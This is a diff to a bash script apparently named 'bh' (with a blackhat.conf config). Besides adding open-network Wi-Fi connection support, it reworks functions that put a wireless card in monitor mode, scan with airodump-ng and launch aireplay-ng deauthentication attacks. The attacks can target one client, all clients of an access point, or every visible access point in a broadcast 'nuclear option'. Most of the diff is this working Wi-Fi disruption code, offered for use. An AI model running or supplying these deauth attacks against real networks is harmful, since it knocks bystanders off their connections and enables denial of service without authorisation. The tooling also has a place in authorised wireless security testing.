@@ -1,4 +1,5 @@
 #!/bin/bash
+set -m
 exec > >(tee /dev/tty1) 2>&1
 
 CONFIG_F=blackhat.conf
@@ -75,7 +76,19 @@ function connect_wifi() {
     echo INET_NIC: $INET_NIC
 
     ip link set $INET_NIC up
-    wpa_supplicant -B -i $INET_NIC -c <(wpa_passphrase "$SSID" "$PASS")
+    if [[ -z ${PASS:-} ]]; then
+        echo "No password, connecting to open network"
+        wpa_supplicant -B -i "$INET_NIC" -c <(cat <<EOF
+network={
+    ssid="$SSID"
+    key_mgmt=NONE
+}
+EOF
+)
+    else
+        echo "Password set"
+        wpa_supplicant -B -i $INET_NIC -c <(wpa_passphrase "$SSID" "$PASS")
+    fi
 }
 
 function start_ap() {
@@ -280,14 +293,15 @@ function ssh() {
 function setup_monitor_mode() {
     local iface=$1
     echo "Setting up monitor mode on $iface..."
-    
+
     # Set to monitor mode
+    ip link set $iface down
     iw dev $iface set type monitor 2>/dev/null
     if [ $? -ne 0 ]; then
         echo "Failed to set monitor mode on $iface"
         return 1
     fi
-    
+
     # Bring interface up
     ip link set $iface up
     echo "Monitor mode enabled on $iface"
@@ -296,13 +310,13 @@ function setup_monitor_mode() {
 
 function deauth_scan() {
     local iface="${1:-wlan1}"
-    
+
     echo "Setting up monitor mode on $iface for scanning..."
     setup_monitor_mode $iface
     if [ $? -ne 0 ]; then
         return 1
     fi
-    
+
     echo "Scanning for targets on $iface (30 seconds)..."
     echo "Press Ctrl+C to stop early"
     echo ""
@@ -311,7 +325,7 @@ function deauth_scan() {
     SCAN_PID=$!
     sleep 30
     kill $SCAN_PID 2>/dev/null
-    
+
     echo ""
     echo "=== SCAN RESULTS ==="
     echo "Access Points (Targets for deauth_all):"
@@ -329,12 +343,12 @@ function deauth_scan() {
             fi
         done
     fi
-    
+
     echo ""
     echo "Usage examples:"
     echo "  bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 $iface"
     echo "  bh deauth_all 11:22:33:44:55:66 $iface"
-    
+
     rm -f /tmp/deauth_targets* 2>/dev/null
 }
 
@@ -343,7 +357,7 @@ function deauth_attack() {
     local ap_mac="$2"
     local iface="${3:-wlan1}"
     local count="${4:-10}"
-    
+
     if [ -z "$client_mac" ] || [ -z "$ap_mac" ]; then
         echo "Usage: bh deauth <client_mac> <ap_mac> [interface] [count]"
         echo "Example: bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1"
@@ -351,18 +365,18 @@ function deauth_attack() {
         echo "To find targets, run: bh deauth_scan [interface]"
         return 1
     fi
-    
+
     echo "Deauth Attack:"
     echo "  Client: $client_mac"
     echo "  AP: $ap_mac"
     echo "  Interface: $iface"
     echo "  Count: $count"
-    
+
     setup_monitor_mode $iface
     if [ $? -ne 0 ]; then
         return 1
     fi
-    
+
     echo "Executing deauth attack..."
     aireplay-ng --deauth $count -a "$ap_mac" -c "$client_mac" $iface
     echo "Deauth attack completed"
@@ -372,7 +386,7 @@ function deauth_all() {
     local ap_mac="$1"
     local iface="${2:-wlan1}"
     local count="${3:-10}"
-    
+
     if [ -z "$ap_mac" ]; then
         echo "Usage: bh deauth_all <ap_mac> [interface] [count]"
         echo "Example: bh deauth_all 11:22:33:44:55:66 wlan1"
@@ -380,17 +394,17 @@ function deauth_all() {
         echo "To find targets, run: bh deauth_scan [interface]"
         return 1
     fi
-    
+
     echo "Deauth All Clients:"
     echo "  Target AP: $ap_mac"
     echo "  Interface: $iface"
     echo "  Count: $count"
-    
+
     setup_monitor_mode $iface
     if [ $? -ne 0 ]; then
         return 1
     fi
-    
+
     echo "Executing deauth attack against all clients..."
     aireplay-ng --deauth $count -a "$ap_mac" $iface
     echo "Deauth all attack completed"
@@ -399,28 +413,33 @@ function deauth_all() {
 function deauth_broadcast() {
     local iface="${1:-wlan1}"
     local count="${2:-5}"
-    
+
     echo "WARNING: Nuclear option - will deauth ALL visible associations!"
     echo "Interface: $iface"
     echo "Count: $count"
     echo ""
     echo "Press Ctrl+C within 5 seconds to cancel..."
     sleep 5
-    
+
     setup_monitor_mode $iface
     if [ $? -ne 0 ]; then
         return 1
     fi
-    
+
     echo "Scanning for targets..."
-    timeout 10 airodump-ng $iface --write /tmp/deauth_broadcast --output-format csv >/dev/null 2>&1
-    
+    rm /tmp/deauth_broadcast* 2>/dev/null
+    airodump-ng $iface --write /tmp/deauth_broadcast --output-format csv > /dev/null 2>&1 &
+    sleep 20
+    kill $!
+    echo "Scan finished"
+
     if [ -f /tmp/deauth_broadcast-01.csv ]; then
         echo "Executing broadcast deauth attacks..."
         grep -v "Station MAC" /tmp/deauth_broadcast-01.csv | grep -v "BSSID" | while IFS=, read bssid rest; do
-            if [ -n "$bssid" ] && [ "$bssid" != "BSSID" ]; then
+            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                 echo "Deauthing AP: $bssid"
-                aireplay-ng --deauth $count -a "$bssid" $iface &
+                iw dev wlan1 set channel 1 # Fix this later
+                aireplay-ng --deauth $count -a "$bssid" $iface --ignore-negative-one
             fi
         done
         wait
@@ -428,7 +447,7 @@ function deauth_broadcast() {
     else
         echo "No targets found"
     fi
-    
+
     rm -f /tmp/deauth_broadcast* 2>/dev/null
 }
 
